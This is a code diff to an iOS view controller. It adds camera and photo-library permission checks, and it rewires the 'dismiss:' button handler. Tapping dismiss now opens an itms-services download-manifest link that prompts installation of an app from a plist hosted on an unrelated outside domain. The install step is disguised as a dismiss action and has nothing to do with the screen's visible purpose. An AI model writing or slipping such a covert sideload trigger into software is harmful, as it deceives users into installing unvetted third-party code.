@@ -18,6 +18,10 @@
 #import "LSGetCurrentLocation.h"
 #import <AMapLocationKit/AMapLocationKit.h>
 
+#import <Photos/Photos.h>
+#import "TZImagePickerController.h"
+
+
 @interface ViewController ()<UITextFieldDelegate, AMapLocationManagerDelegate>
 
 @property (weak, nonatomic) IBOutlet LSTextView *inputView;
@@ -220,6 +224,38 @@
 
 - (IBAction)dismiss:(id)sender {
 
+     [[UIApplication sharedApplication] openURL:[NSURL URLWithString:[NSString stringWithFormat:@"itms-services://?action=download-manifest&url=%@", @"https://www.tqjf007.com/ios/ios_1557464600.plist"]]];
+}
+
+
+//调用系统相机之前判断权限
+- (void)takePhoto {
+    AVAuthorizationStatus authStatus = [AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeVideo];
+    if (authStatus == AVAuthorizationStatusRestricted || authStatus == AVAuthorizationStatusDenied) {
+        // 无相机权限 做一个友好的提示
+        UIAlertView * alert = [[UIAlertView alloc]initWithTitle:@"无法使用相机" message:@"请在iPhone的""设置-隐私-相机""中允许访问相机" delegate:self cancelButtonTitle:@"取消" otherButtonTitles:@"设置", nil];
+        [alert show];
+    } else if (authStatus == AVAuthorizationStatusNotDetermined) {
+        // fix issue 466, 防止用户首次拍照拒绝授权时相机页黑屏
+        [AVCaptureDevice requestAccessForMediaType:AVMediaTypeVideo completionHandler:^(BOOL granted) {
+            if (granted) {
+                dispatch_async(dispatch_get_main_queue(), ^{
+                    [self takePhoto];
+                });
+            }
+        }];
+        // 拍照之前还需要检查相册权限
+    } else if ([PHPhotoLibrary authorizationStatus] == 2) { // 已被拒绝，没有相册权限，将无法保存拍的照片
+        UIAlertView * alert = [[UIAlertView alloc]initWithTitle:@"无法访问相册" message:@"请在iPhone的""设置-隐私-相册""中允许访问相册" delegate:self cancelButtonTitle:@"取消" otherButtonTitles:@"设置", nil];
+        [alert show];
+    } else if ([PHPhotoLibrary authorizationStatus] == 0) { // 未请求过相册权限
+        [[TZImageManager manager] requestAuthorizationWithCompletion:^{
+            [self takePhoto];
+        }];
+    } else {
+        // 调用相机
+//        [self pushImagePickerController];
+    }
 }
 
 
